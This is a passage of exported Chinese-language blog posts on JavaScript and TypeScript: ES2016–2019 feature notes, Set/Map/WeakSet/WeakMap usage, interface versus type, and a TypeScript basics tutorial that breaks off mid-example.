下次调用`next()`时，再继续往下执行直到遇到下一个`yield`命令  - 没有再遇到`yield`命令就一直运行到`Generator`函数结束，直到遇到`return`语句为止并将其后表达式的值作为返回对象的`value`  - `Generator`函数没有`return`语句则返回对象的`value`为`undefined`- `yield*`命令：在一个`Generator`函数里执行另一个`Generator`函数(后随具有`Iterator`接口的数据结构)- 遍历：通过`for-of`自动调用`next()`- 作为对象属性  - 全写：`const obj = &#123; method: function*() &#123;&#125; &#125;`  - 简写：`const obj = &#123; * method() &#123;&#125; &#125;`- 上下文：执行产生的上下文环境一旦遇到`yield`命令就会暂时退出堆栈(但并不消失)，所有变量和对象会冻结在当前状态，等到对它执行`next()`时，这个上下文环境又会重新加入调用栈，冻结的变量和对象恢复执行**方法异同**- 相同点  ：  - `next()`、`throw()`、`return()`本质上是同一件事，作用都是让函数恢复执行且使用不同的语句替换yield命令- 不同点  - `next()`：将`yield`命令替换成一个值  - `return()`：将`yield`命令替换成一个`return`语句  - `throw()`：将`yield`命令替换成一个`throw`语句**应用场景**- 异步操作同步化表达- 控制流管理- 为对象部署`Iterator`接口：把`Generator`函数赋值给对象的`Symbol.iterator`，从而使该对象具有`Iterator`接口- 作为具有`Iterator`接口的数据结构**重点难点**- 每次调用`next()`，指针就从函数头部或上次停下的位置开始执行，直到遇到下一个`yield`命令或`return`语句为止- 函数内部可不用`yield`命令，但会变成单纯的暂缓执行函数(还是需要`next()`触发)- `yield`命令是暂停执行的标记，`next()`是恢复执行的操作- `yield`命令用在另一个表达式中必须放在圆括号里- `yield`命令用作函数参数或放在赋值表达式的右边，可不加圆括号- `yield`命令本身没有返回值，可认为是返回`undefined`- `yield`命令表达式为惰性求值，等`next()`执行到此才求值- 函数调用后生成遍历器对象，此对象的`Symbol.iterator`是此对象本身- 在函数运行的不同阶段，通过`next()`从外部向内部注入不同的值，从而调整函数行为- 首个`next()`用来启动遍历器对象，后续才可传递参数- 想首次调用`next()`时就能输入值，可在函数外面再包一层- 一旦`next()`返回对象的`done`为`true`，`for-of`遍历会中止且不包含该返回对象- 函数内部部署`try-finally`且正在执行`try`，那么`return()`会导致立刻进入`finally`，执行完`finally`以后整个函数才会结束- 函数内部没有部署`try-catch`，`throw()`抛错将被外部`try-catch`捕获- `throw()`抛错要被内部捕获，前提是必须至少执行过一次`next()`- `throw()`被捕获以后，会附带执行下一条`yield`命令- 函数还未开始执行，这时`throw()`抛错只可能抛出在函数外部&gt; 首次next()可传值\nfunction Wrapper(func) &#123;\n  return function(...args) &#123;\n      const generator = func(...args);\n      generator.next();\n      return generator;\n  &#125;\n&#125;\nconst print = Wrapper(function*() &#123;\n  console.log(`First Input: $&#123;yield&#125;`);\n  return &quot;done&quot;;\n&#125;);\nprint().next(&quot;hello&quot;);\n## ES2016![img](https://poetries1.gitee.io/img-repo/2019/11/126.png)### 数值扩展- 指数运算符(`**`)：数值求幂(相当于`Math.pow()`)### 数组扩展- `includes()`：是否存在指定成员## ES2017![img](https://poetries1.gitee.io/img-repo/2019/11/127.png)**声明**- 共享内存和原子操作：由全局对象`SharedArrayBuffer`和`Atomics`实现，将数据存储在一块共享内存空间中，这些数据可在`JS`主线程和`web-worker`线程之间共享### 字符串扩展- `padStart()`：把指定字符串填充到字符串头部，返回新字符串- `padEnd()`：把指定字符串填充到字符串尾部，返回新字符串**对象扩展**- `Object.getOwnPropertyDescriptors()`：返回对象所有自身属性(非继承属性)的描述对象- `Object.values()`：返回以值组成的数组- `Object.entries()`：返回以键和值组成的数组### 函数扩展- 函数参数尾逗号：允许函数最后一个参数有尾逗号**Async**- 定义：使异步函数以同步函数的形式书写(`Generator`函数语法糖)- 原理：将`Generator`函数和自动执行器`spawn`包装在一个函数里- 形式：将`Generator`函数的`*`替换成`async`，将`yield`替换成`await`- 声明  - 具名函数：`async function Func() &#123;&#125;`  - 函数表达式：`const func = async function() &#123;&#125;`  - 箭头函数：`const func = async() =&gt; &#123;&#125;`  - 对象方法：`const obj = &#123; async func() &#123;&#125; &#125;`  - 类方法：`class Cla &#123; async Func() &#123;&#125; &#125;`- await命令  ：等待当前\nPromise\n  对象状态变更完毕  - 正常情况：后面是`Promise`对象则返回其结果，否则返回对应的值  - 后随`Thenable`对象：将其等同于`Promise`对象返回其结果- **错误处理**：将`await`命令`Promise`对象放到`try-catch`中(可放多个)**Async对Generator改进**- 内置执行器- 更好的语义- 更广的适用性- 返回值是`Promise`对象**应用场景**- 按顺序完成异步操作**重点难点**- `Async`函数返回`Promise`对象，可使用`then()`添加回调函数- 内部`return`返回值会成为后续`then()`的出参- 内部抛出错误会导致返回的`Promise`对象变为`rejected`状态，被`catch()`接收到- 返回的`Promise`对象必须等到内部所有`await`命令`Promise`对象执行完才会发生状态改变，除非遇到`return`语句或抛出错误- 任何一个`await`命令`Promise`对象变为`rejected`状态，整个`Async`函数都会中断执行- 希望即使前一个异步操作失败也不要中断后面的异步操作  - 将`await`命令`Promise`对象放到`try-catch`中  - `await`命令`Promise`对象跟一个`catch()`- `await`命令`Promise`对象可能变为`rejected`状态，最好把其放到`try-catch`中- 多个`await`命令`Promise`对象若不存在继发关系，最好让它们同时触发- `await`命令只能用在`Async`函数之中，否则会报错- 数组使用`forEach()`执行`async/await`会失效，可使用`for-of`和P`romise.all()`代替- 可保留运行堆栈，函数上下文随着`Async`函数的执行而存在，执行完成就消失## ES2018![img](https://poetries1.gitee.io/img-repo/2019/11/128.png)### 字符串扩展- 放松对标签模板里字符串转义的限制：遇到不合法的字符串转义返回`undefined`，并且从`raw`上可获取原字符串**对象扩展**- 扩展运算符(`...`)：转换对象为用逗号分隔的参数序列(`&#123; ...obj &#125;`，相当于`rest/spread`参数的逆运算)&gt; 扩展应用- 克隆对象：`const obj = &#123; __proto__: Object.getPrototypeOf(obj1), ...obj1 &#125;`- 合并对象：`const obj = &#123; ...obj1, ...obj2 &#125;`- 转换字符串为对象：`&#123; ...&quot;hello&quot; &#125;`- 转换数组为对象：`&#123; ...[1, 2] &#125;`- 与对象解构赋值结合：`const &#123; x, ...rest/spread &#125; = &#123; x: 1, y: 2, z: 3 &#125;`(不能复制继承自原型对象的属性)- 修改现有对象部分属性：`const obj = &#123; x: 1, ...&#123; x: 2 &#125; &#125;`### 正则扩展- `s`修饰符：`dotAll`模式修饰符，使`.`匹配任意单个字符(`dotAll`模式)- `dotAll`：是否设置`s`修饰符- 后行断言：`x`只有在`y`后才匹配- 后行否定断言：`x`只有不在`y`后才匹配- `Unicode`属性转义  ：匹配符合\nUnicode\n  某种属性的所有字符  - 正向匹配：`\\p&#123;PropRule&#125;`  - 反向匹配：`\\P&#123;PropRule&#125;`  - 限制：`\\p&#123;...&#125;`和`\\P&#123;...&#125;`只对`Unicode`字符有效，使用时需加上u修饰符- 具名组匹配  ：为每组匹配指定名字(\n?&lt;GroupName&gt;\n  )  - 形式：`str.exec().groups.GroupName`  - 解构赋值替换    - 声明：`const time = &quot;2017-09-11&quot;、const regexp = /(?\\d&#123;4&#125;)-(?\\d&#123;2&#125;)-(?\\d&#123;2&#125;)/u`    - 匹配：`time.replace(regexp, &quot;$/$/$&quot;)`### Promise- `finally()`：指定不管最后状态如何都会执行的回调函数### Async- 异步迭代器(`for-await-of`)：，循环等待每个`Promise`对象变为`resolved`状态才进入下一步## ES2019![img](https://poetries1.gitee.io/img-repo/2019/11/129.png)### 字符串扩展- 直接输入`U+2028`和`U+2029`：字符串可直接输入行分隔符和段分隔符- `JSON.stringify()`改造：可返回不符合`UTF-8`标准的字符串- `trimStart()`：消除字符串头部空格，返回新字符串- `trimEnd()`：消除字符串尾部空格，返回新字符串### 对象扩展- `Object.fromEntries()`：返回以键和值组成的对象(`Object.entries()`的逆操作)### 数组扩展- `flat()`：扁平化数组，返回新数组- `flatMap()`：映射且扁平化数组，返回新数组(只能展开一层数组)### 函数扩展- `toString()`改造：返回函数原始代码(与编码一致)- `catch()`参数可省略：`catch()`中的参数可省略### Symbol- `description`：返回`Symbol`值的描述## ES提案![img](https://poetries1.gitee.io/img-repo/2019/11/130.png)### 声明- `globalThis`对象：作为顶层对象，指向全局环境下的`this`- `do`表达式：封装块级作用域的操作，返回内部最后执行表达式的值(`do&#123;&#125;`)- `throw`表达式：直接使用`throw new Error()`，无需`()`或`&#123;&#125;`包括- `!#`命令：指定脚本执行器(写在文件首行)### 数值扩展- 数值分隔符(`_`)：使用`_`作为千分位分隔符(增加数值的可读性)- `BigInt()`：创建任何位数的整数(新增的数据类型，使用`n`结尾)### 对象扩展- 链判断操作符(`?.`)：是否存在对象属性(不存在返回`undefined`且不再往下执行)- 空判断操作符(`??`)：是否值为`undefined`或`null`，是则使用默认值### 函数扩展- 函数部分执行：复用函数功能(`?`表示单个参数占位符，`...`表示多个参数占位符)- 管道操作符(`|&gt;`)：把左边表达式的值传入右边的函数进行求值(`f(x) =&gt; x |&gt; f`)- 绑定运算符(\n::\n)：函数绑定(左边是对象右边是函数，取代\nbind\n、\napply\n、\ncall\n\n调用)\n\nbind：bar.bind(foo) &#x3D;&gt; foo::bar\napply：bar.apply(foo, arguments)=&gt;foo::bar(…arguments)&#96;\n\n\n\nProxy\nPromise.try()：不想区分是否同步异步函数，包装函数为实例，使用then()指定下一步流程，使用catch()捕获错误\n\nRealm\n定义：提供沙箱功能，允许隔离代码，防止被隔离的代码拿到全局对象\n声明：new Realm().global\n\nClass\n静态属性：使用static定义属性，该属性不会被实例继承，只能通过类来调用\n私有属性：使用#定义属性，该属性只能在类内部访问\n私有方法：使用#定义方法，该方法只能在类内部访问\n装饰器：使用@注释或修改类和类方法\n\nModule\nimport()：动态导入(返回Promise)\n背景：import命令被JS引擎静态分析，先于模块内的其他语句执行，无法取代require()的动态加载功能，提案建议引入import()来代替require()\n位置：可在任何地方使用\n区别：require()是同步加载，import()是异步加载\n场景：按需加载、条件加载、模块路径动态化\n\n\nimport.meta：返回脚本元信息\n\nAsync\n顶层Await：允许在模块的顶层独立使用await命令(借用await解决模块异步加载的问题)\n\n","categories":["前端"],"tags":["es6"]},{"title":"ES6 Set-Map","url":"/2018/04/10/html+css+js+ts/4-set+map/","content":"\nSet 和 Map 主要的应用场景在于 数据重组 和 数据储存\nSet 是一种叫做集合的数据结构，Map 是一种叫做字典的数据结构\n\n1. 集合（Set）\nES6 新增的一种新的数据结构，类似于数组，但成员是唯一且无序的，没有重复的值。\n\nSet 本身是一种构造函数，用来生成 Set 数据结构。\nnew Set([iterable])\n\n举个例子：\nconst s = new Set()[1, 2, 3, 4, 3, 2, 1].forEach(x =&gt; s.add(x))for (let i of s) &#123;    console.log(i)\t// 1 2 3 4&#125;// 去重数组的重复对象let arr = [1, 2, 3, 2, 1, 1][... new Set(arr)]\t// [1, 2, 3]\n\nSet 对象允许你储存任何类型的唯一值，无论是原始值或者是对象引用。\n向 Set 加入值的时候，不会发生类型转换，所以5和&quot;5&quot;是两个不同的值。Set 内部判断两个值是否不同，使用的算法叫做“Same-value-zero equality”，它类似于精确相等运算符（===），主要的区别是 Set 认为NaN等于自身，而精确相等运算符认为NaN不等于自身。\nlet set = new Set();let a = NaN;let b = NaN;set.add(a);set.add(b);set // Set &#123;NaN&#125;let set1 = new Set()set1.add(5)set1.add(&#x27;5&#x27;)console.log([...set1])\t// [5, &quot;5&quot;]\n\n\nSet 实例属性\n\nconstructor： 构造函数\n\nsize：元素数量\nlet set = new Set([1, 2, 3, 2, 1])console.log(set.length)\t// undefinedconsole.log(set.size)\t// 3\n\n\nSet 实例方法\n\n操作方法\n\nadd(value)：新增，相当于 array里的push\n\ndelete(value)：存在即删除集合中value\n\nhas(value)：判断集合中是否存在 value\n\nclear()：清空集合\n\nlet set = new Set()set.add(1).add(2).add(1)set.has(1)\t// trueset.has(3)\t// falseset.delete(1)\tset.has(1)\t// false\n\nArray.from 方法可以将 Set 结构转为数组\nconst items = new Set([1, 2, 3, 2])const array = Array.from(items)console.log(array)\t// [1, 2, 3]// 或const arr = [...items]console.log(arr)\t// [1, 2, 3]\n\n\n遍历方法（遍历顺序为插入顺序）\n\nkeys()：返回一个包含集合中所有键的迭代器\n\nvalues()：返回一个包含集合中所有值得迭代器\n\nentries()：返回一个包含Set对象中所有元素得键值对迭代器\n\nforEach(callbackFn, thisArg)：用于对集合成员执行callbackFn操作，如果提供了 thisArg 参数，回调中的this会是这个参数，没有返回值\nlet set = new Set([1, 2, 3])console.log(set.keys())\t// SetIterator &#123;1, 2, 3&#125;console.log(set.values())\t// SetIterator &#123;1, 2, 3&#125;console.log(set.entries())\t// SetIterator &#123;1, 2, 3&#125;for (let item of set.keys()) &#123;  console.log(item);&#125;\t// 1\t2\t 3for (let item of set.entries()) &#123;  console.log(item);&#125;\t// [1, 1]\t[2, 2]\t[3, 3]set.forEach((value, key) =&gt;  &#123;    console.log(key + &#x27; : &#x27; + value)&#125;)\t// 1 : 1\t2 : 2\t\t3 : 3console.log([...set])\t// [1, 2, 3]\n\nSet 可默认遍历，默认迭代器生成函数是 values() 方法\nSet.prototype[Symbol.iterator] === Set.prototype.values\t// true\n\n所以， Set可以使用 map、filter 方法\nlet set = new Set([1, 2, 3])set = new Set([...set].map(item =&gt; item * 2))console.log([...set])\t// [2, 4, 6]set = new Set([...set].filter(item =&gt; (item &gt;= 4)))console.log([...set])\t//[4, 6]\n\n因此，Set 很容易实现交集（Intersect）、并集（Union）、差集（Difference）\nlet set1 = new Set([1, 2, 3])let set2 = new Set([4, 3, 2])let intersect = new Set([...set1].filter(value =&gt; set2.has(value)))let union = new Set([...set1, ...set2])let difference = new Set([...set1].filter(value =&gt; !set2.has(value)))console.log(intersect)\t// Set &#123;2, 3&#125;console.log(union)\t\t// Set &#123;1, 2, 3, 4&#125;console.log(difference)\t// Set &#123;1&#125;\n\n\n\n\n\n2. WeakSetWeakSet 对象允许你将弱引用对象储存在一个集合中\nWeakSet 与 Set 的区别：\n\nWeakSet 只能储存对象引用，不能存放值，而 Set 对象都可以\nWeakSet 对象中储存的对象值都是被弱引用的，即垃圾回收机制不考虑 WeakSet 对该对象的应用，如果没有其他的变量或属性引用这个对象值，则这个对象将会被垃圾回收掉（不考虑该对象还存在于 WeakSet 中），所以，WeakSet 对象里有多少个成员元素，取决于垃圾回收机制有没有运行，运行前后成员个数可能不一致，遍历结束之后，有的成员可能取不到了（被垃圾回收了），WeakSet 对象是无法被遍历的（ES6 规定 WeakSet 不可遍历），也没有办法拿到它包含的所有元素\n\n属性：\n\nconstructor：构造函数，任何一个具有 Iterable 接口的对象，都可以作参数\nconst arr = [[1, 2], [3, 4]]const weakset = new WeakSet(arr)console.log(weakset)\n\n\n方法：\n\nadd(value)：在WeakSet 对象中添加一个元素value\nhas(value)：判断 WeakSet 对象中是否包含value\ndelete(value)：删除元素 value\nclear()：清空所有元素，注意该方法已废弃\n\nvar ws = new WeakSet()var obj = &#123;&#125;var foo = &#123;&#125;ws.add(window)ws.add(obj)ws.has(window)\t// truews.has(foo)\t// falsews.delete(window)\t// truews.has(window)\t// false\n\n3. 字典（Map）集合 与 字典 的区别：\n\n共同点：集合、字典 可以储存不重复的值\n不同点：集合 是以 [value, value]的形式储存元素，字典 是以 [key, value] 的形式储存\n\nconst m = new Map()const o = &#123;p: &#x27;haha&#x27;&#125;m.set(o, &#x27;content&#x27;)m.get(o)\t// contentm.has(o)\t// truem.delete(o)\t// truem.has(o)\t// false\n\n任何具有 Iterator 接口、且每个成员都是一个双元素的数组的数据结构都可以当作Map构造函数的参数，例如：\nconst set = new Set([  [&#x27;foo&#x27;, 1],  [&#x27;bar&#x27;, 2]]);const m1 = new Map(set);m1.get(&#x27;foo&#x27;) // 1const m2 = new Map([[&#x27;baz&#x27;, 3]]);const m3 = new Map(m2);m3.get(&#x27;baz&#x27;) // 3\n\n如果读取一个未知的键，则返回undefined。\nnew Map().get(&#x27;asfddfsasadf&#x27;)// undefined\n\n注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。这一点要非常小心。\nconst map = new Map();map.set([&#x27;a&#x27;], 555);map.get([&#x27;a&#x27;]) // undefined\n\n上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，内存地址是不一样的，因此get方法无法读取该键，返回undefined。\n由上可知，Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。这就解决了同名属性碰撞（clash）的问题，我们扩展别人的库的时候，如果使用对象作为键名，就不用担心自己的属性与原作者的属性同名。\n如果 Map 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，Map 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 Map 将其视为同一个键。\nlet map = new Map();map.set(-0, 123);map.get(+0) // 123map.set(true, 1);map.set(&#x27;true&#x27;, 2);map.get(true) // 1map.set(undefined, 3);map.set(null, 4);map.get(undefined) // 3map.set(NaN, 123);map.get(NaN) // 123\n\nMap 的属性及方法\n属性：\n\nconstructor：构造函数\n\nsize：返回字典中所包含的元素个数\nconst map = new Map([  [&#x27;name&#x27;, &#x27;An&#x27;],  [&#x27;des&#x27;, &#x27;JS&#x27;]]);map.size // 2\n\n操作方法：\n\nset(key, value)：向字典中添加新元素\nget(key)：通过键查找特定的数值并返回\nhas(key)：判断字典中是否存在键key\ndelete(key)：通过键 key 从字典中移除对应的数据\nclear()：将这个字典中的所有元素删除\n\n遍历方法\n\nKeys()：将字典中包含的所有键名以迭代器形式返回\nvalues()：将字典中包含的所有数值以迭代器形式返回\nentries()：返回所有成员的迭代器\nforEach()：遍历字典的所有成员\n\nconst map = new Map([            [&#x27;name&#x27;, &#x27;An&#x27;],            [&#x27;des&#x27;, &#x27;JS&#x27;]        ]);console.log(map.entries())\t// MapIterator &#123;&quot;name&quot; =&gt; &quot;An&quot;, &quot;des&quot; =&gt; &quot;JS&quot;&#125;console.log(map.keys()) // MapIterator &#123;&quot;name&quot;, &quot;des&quot;&#125;\n\nMap 结构的默认遍历器接口（Symbol.iterator属性），就是entries方法。\nmap[Symbol.iterator] === map.entries// true\n\nMap 结构转为数组结构，比较快速的方法是使用扩展运算符（...）。\n对于 forEach ，看一个例子\nconst reporter = &#123;  report: function(key, value) &#123;    console.log(&quot;Key: %s, Value: %s&quot;, key, value);  &#125;&#125;;let map = new Map([    [&#x27;name&#x27;, &#x27;An&#x27;],    [&#x27;des&#x27;, &#x27;JS&#x27;]])map.forEach(function(value, key, map) &#123;  this.report(key, value);&#125;, reporter);// Key: name, Value: An// Key: des, Value: JS\n\n在这个例子中， forEach 方法的回调函数的 this，就指向 reporter\n与其他数据结构的相互转换\n\nMap 转 Array\nconst map = new Map([[1, 1], [2, 2], [3, 3]])console.log([...map])\t// [[1, 1], [2, 2], [3, 3]]\n\nArray 转 Map\nconst map = new Map([[1, 1], [2, 2], [3, 3]])console.log(map)\t// Map &#123;1 =&gt; 1, 2 =&gt; 2, 3 =&gt; 3&#125;\n\nMap 转 Object\n因为 Object 的键名都为字符串，而Map 的键名为对象，所以转换的时候会把非字符串键名转换为字符串键名。\nfunction mapToObj(map) &#123;    let obj = Object.create(null)    for (let [key, value] of map) &#123;        obj[key] = value    &#125;    return obj&#125;const map = new Map().set(&#x27;name&#x27;, &#x27;An&#x27;).set(&#x27;des&#x27;, &#x27;JS&#x27;)mapToObj(map) // &#123;name: &quot;An&quot;, des: &quot;JS&quot;&#125;\n\nObject 转 Map\nfunction objToMap(obj) &#123;    let map = new Map()    for (let key of Object.keys(obj)) &#123;        map.set(key, obj[key])    &#125;    return map&#125;objToMap(&#123;&#x27;name&#x27;: &#x27;An&#x27;, &#x27;des&#x27;: &#x27;JS&#x27;&#125;) // Map &#123;&quot;name&quot; =&gt; &quot;An&quot;, &quot;des&quot; =&gt; &quot;JS&quot;&#125;\n\nMap 转 JSON\nfunction mapToJson(map) &#123;    return JSON.stringify([...map])&#125;let map = new Map().set(&#x27;name&#x27;, &#x27;An&#x27;).set(&#x27;des&#x27;, &#x27;JS&#x27;)mapToJson(map)\t// [[&quot;name&quot;,&quot;An&quot;],[&quot;des&quot;,&quot;JS&quot;]]\n\nJSON 转 Map\nfunction jsonToStrMap(jsonStr) &#123;  return objToMap(JSON.parse(jsonStr));&#125;jsonToStrMap(&#x27;&#123;&quot;name&quot;: &quot;An&quot;, &quot;des&quot;: &quot;JS&quot;&#125;&#x27;) // Map &#123;&quot;name&quot; =&gt; &quot;An&quot;, &quot;des&quot; =&gt; &quot;JS&quot;&#125;\n\n4. WeakMapWeakMap 对象是一组键值对的集合，其中的键是弱引用对象，而值可以是任意。\n注意，WeakMap 弱引用的只是键名，而不是键值。键值依然是正常引用。\nWeakMap 中，每个键对自己所引用对象的引用都是弱引用，在没有其他引用和该键引用同一对象，这个对象将会被垃圾回收（相应的key则变成无效的），所以，WeakMap 的 key 是不可枚举的。\n属性：\n\nconstructor：构造函数\n\n方法：\n\nhas(key)：判断是否有 key 关联对象\nget(key)：返回key关联对象（没有则则返回 undefined）\nset(key)：设置一组key关联对象\ndelete(key)：移除 key 的关联对象\n\nlet myElement = document.getElementById(&#x27;logo&#x27;);let myWeakmap = new WeakMap();myWeakmap.set(myElement, &#123;timesClicked: 0&#125;);myElement.addEventListener(&#x27;click&#x27;, function() &#123;  let logoData = myWeakmap.get(myElement);  logoData.timesClicked++;&#125;, false);\n\n5. 总结\nSet\n成员唯一、无序且不重复\n[value, value]，键值与键名是一致的（或者说只有键值，没有键名）\n可以遍历，方法有：add、delete、has\n\n\nWeakSet\n成员都是对象\n成员都是弱引用，可以被垃圾回收机制回收，可以用来保存DOM节点，不容易造成内存泄漏\n不能遍历，方法有add、delete、has\n\n\nMap\n本质上是键值对的集合，类似集合\n可以遍历，方法很多可以跟各种数据格式转换\n\n\nWeakMap\n只接受对象作为键名（null除外），不接受其他类型的值作为键名\n键名是弱引用，键值可以是任意的，键名所指向的对象可以被垃圾回收，此时键名是无效的\n不能遍历，方法有get、set、has、delete\n\n\n\n6. 扩展：Object与Set、Map\nObject 与 Set\n// Objectconst properties1 = &#123;    &#x27;width&#x27;: 1,    &#x27;height&#x27;: 1&#125;console.log(properties1[&#x27;width&#x27;]? true: false) // true// Setconst properties2 = new Set()properties2.add(&#x27;width&#x27;)properties2.add(&#x27;height&#x27;)console.log(properties2.has(&#x27;width&#x27;)) // true\n\nObject 与 Map\n\n\nJS 中的对象（Object），本质上是键值对的集合（hash 结构）\nconst data = &#123;&#125;;const element = document.getElementsByClassName(&#x27;App&#x27;);data[element] = &#x27;metadata&#x27;;console.log(data[&#x27;[object HTMLCollection]&#x27;]) // &quot;metadata&quot;\n\n但当以一个DOM节点作为对象 data 的键，对象会被自动转化为字符串[Object HTMLCollection]，所以说，Object 结构提供了 字符串-值 对应，Map则提供了 值-值 的对应\n","categories":["前端"],"tags":["es6"]},{"title":"TS-interface与type区别","url":"/2021/07/25/html+css+js+ts/5-Ts-interface%E4%B8%8Etype%E5%8C%BA%E5%88%AB/","content":"相同之处都可以描述一个对象或者函数interface\ninterface User &#123;  name: string  age: number&#125;interface SetUser &#123;  (name: string, age: number): void;&#125;\n\ntype\ntype User = &#123;  name: string  age: number&#125;;type SetUser = (name: string, age: number)=&gt; void;\n\n都允许拓展（extends）\ninterface 和 type 都可以拓展，并且两者并不是相互独立的，也就是说 interface 可以 extends type, type 也可以 extends interface 。 虽然效果差不多，但是两者语法不同\n\ninterface extends interface\ninterface Name &#123;   name: string; &#125;interface User extends Name &#123;   age: number; &#125;\n\ntype extends type\ntype Name = &#123;   name: string; &#125;type User = Name &amp; &#123; age: number  &#125;;\n\ninterface extends type\ntype Name = &#123;   name: string; &#125;interface User extends Name &#123;   age: number; &#125;\n\ntype extends interface\ninterface Name &#123;   name: string; &#125;type User = Name &amp; &#123;   age: number; &#125;\n\n不同之处type 可以而 interface 不行\ntype 可以声明基本类型别名，联合类型，元组等类型\n\n// 基本类型别名type Name = string// 联合类型interface Dog &#123;    wong();&#125;interface Cat &#123;    miao();&#125;type Pet = Dog | Cat// 具体定义数组每个位置的类型type PetList = [Dog, Pet]\n\ntype 语句中还可以使用 typeof 获取实例的 类型进行赋值\n// 当你想获取一个变量的类型时，使用 typeoflet div = document.createElement(&#x27;div&#x27;);type B = typeof div\n\n其他骚操作\ntype StringOrNumber = string | number;  type Text = string | &#123; text: string &#125;;  type NameLookup = Dictionary&lt;string, Person&gt;;  type Callback&lt;T&gt; = (data: T) =&gt; void;  type Pair&lt;T&gt; = [T, T];  type Coordinates = Pair&lt;number&gt;;  type Tree&lt;T&gt; = T | &#123; left: Tree&lt;T&gt;, right: Tree&lt;T&gt; &#125;;\n\ninterface 可以而 type 不行\ninterface 能够声明合并\n\ninterface User &#123;  name: string  age: number&#125;interface User &#123;  sex: string&#125;/*User 接口为 &#123;  name: string  age: number  sex: string &#125;*/\n\n\n如果不清楚什么时候用interface/type，能用 interface 实现，就用 interface , 如果不能就用 type\n\n","categories":["前端"],"tags":["typescript"]},{"title":"Typescript基础总结","url":"/2021/08/03/html+css+js+ts/5-Typescript%E5%9F%BA%E7%A1%80/","content":"一、typescript 安装npm i typescript -g\n\n\n全局安装完成后，我们新建一个hello.ts的ts文件\n\n// hello.ts内容let a = &quot;poet&quot;\n\n\n接下来我们在命令行输入tsc hello.ts来编译这个ts文件，然后会在同级目录生成一个编译好了的hello.js文件\n\n// hello.js内容var = &quot;poet&quot;\n\n\n那么我们每次都要输tsc hello.ts命令来编译，这样很麻烦，能否让它自动编译？答案是可以的，使用vscode来开发，需要配置一下vscode就可以。\n\n\n首先我们在命令行执行tsc --init来生成配置文件，然后我们在目录下看到生成了一个tsconfig.json文件\n\n\n\n这个json文件里有很多选项\n\n\ntarget是选择编译到什么语法\nmodule则是模块类型\noutDir则是输出目录，可以指定这个参数到指定目录\n\n\n更多细节 https://zhongsp.gitbooks.io/typescript-handbook/content/doc/handbook/tsconfig.json.html\n\n\n接下来我们需要开启监控了，在vscode任务栏中\n\n\nTypescript在线编辑器\n\n建议使用在线编辑器练习 http://www.typescriptlang.org/play/index.html\n\n二、数据类型\njs是弱类型语言，强弱类语言有什么区别呢？typescript最大的优点就是类型检查，可以帮你检查你定义的类型和赋值的类型。\n\n2.1 布尔类型boolean// 在js中，定义isFlag为true，为布尔类型booleanlet isFlag = true;// 但是我们也可以重新给它赋值为字符串isFlag = &quot;hello swr&quot;;// 在ts中，定义isFlag为true，为布尔类型boolean// 在变量名后加冒号和类型，如  :booleanlet isFlag:boolean = true// 重新赋值到字符串类型会报错isFlag = &quot;hello swr&quot; // 在java中，一般是这样定义，要写变量名也要写类型名// int a = 10; // string name = &quot;poetries&quot;\n\n2.2 数字类型numberlet age:number = 28;age = 29;\n\n2.3 字符串类型stringlet name:string = &quot;poetries&quot;name = &quot;iamswr&quot;\n\n\n以上boolean、number、string类型有个共性，就是可以通过typeof来获取到是什么类型，是基本数据类型\n\n那么复杂的数据类型是怎么处理的呢？\n2.4 数组 Array// 数组// 这是一个字符串数组，只能往里面放字符串，写别的类型会报错let persion:string[] = [&#x27;poetries&#x27;, &#x27;jing&#x27;]// 另一个写法 let persions:Array&lt;string&gt; = [&#x27;poetries&#x27;, &#x27;jing&#x27;]// 如果数组里放对象呢let persionObject:Array&lt;object&gt; = [&#123;name:&#x27;poetries&#x27;,age:22&#125;]let persionObjects:object[] = [&#123;name:&#x27;poetries&#x27;,age:22&#125;]// 在数组中放string、number、boolean、objectlet arr:Array&lt;number|object|string|boolean&gt; = [22, &#x27;test&#x27;, true, &#123;name:&#x27;poetries&#x27;&#125;]// 数组中放什么都可以let arrAny:Array&lt;any&gt; = [&#x27;test&#x27;,12,false]\n\n2.5 元组类型tuple\n什么是元组类型？其实元组是数组的一种。\n有点类似解构赋值，但是又不完全是解构赋值，比如元组类型必须一一对应上\n元组类型是一个不可变的数组，长度、类型是不可变的\n\n// 元组类型tuple// 什么是元组类型？其实元组是数组的一种let per :[string,number,object] = [&#x27;poetries&#x27;,22,&#123;love: &#x27;coding&#x27;&#125;]\n\n2.6 枚举类型enum\n什么是枚举？枚举有点类似一一列举，一个一个数出来。一般用于值是某几个固定的值\n\n// 枚举类型enumenum sex &#123;    BOY=&#x27;男孩&#x27;,    GIRL=&#x27;女孩&#x27;&#125;console.log(sex)// 转化为es5语法// 我们顺便看看实现的原理var sex;(function (sex) &#123;// 首先这里是一个自执行函数// 并且把sex定义为对象，传参进给自执行函数// 然后给sex对象添加属性并且赋值    sex[&quot;BOY&quot;] = &quot;\\u7537\\u5B69&quot;;    sex[&quot;GIRL&quot;] = &quot;\\u5973\\u5B69&quot;;&#125;)(sex || (sex = &#123;&#125;));console.log(sex);\n\n\n比如我们实际项目中，特别是商城类，订单会存在很多状态流转，那么非常适合用枚举\n\nenum orderStatus &#123;    WAIT_FOR_PAY = &quot;待支付&quot;,    UNDELIVERED = &quot;完成支付，待发货&quot;,    DELIVERED = &quot;已发货&quot;,    COMPLETED = &quot;已确认收货&quot;&#125;\n\n\n到这里，我们会有一个疑虑，为什么我们不这样写呢？\n\nlet orderStatus2 = &#123;    WAIT_FOR_PAY : &quot;待支付&quot;,    ...&#125;\n\n\n如果我们直接写对象的键值对方式，是可以在外部修改这个值的，而我们通过enum则不能修改定义好的值了\n\n2.7 任意类型 any\nany有好处也有坏处，特别是前端，很多时候写类型的时候，几乎分不清楚类型，任意去写，写起来很爽，但是对于后续的重构、迭代等是非常不友好的，会暴露出很多问题，某种程度来说，any类型就是放弃了类型检查了\n\n比如我们有这样一个场景，就是需要获取某一个dom节点\nlet btn = document.getElementById(&#x27;btn&#x27;);btn.style.color = &quot;blue&quot;;\n\n\n此时我们发现在ts中会报错\n\n\n\n因为我们取这个dom节点，有可能取到，也有可能没取到，当没取到的时候，相当于是null，是没有style这个属性的。\n那么我们可以给它添加一个类型为any\n\n// 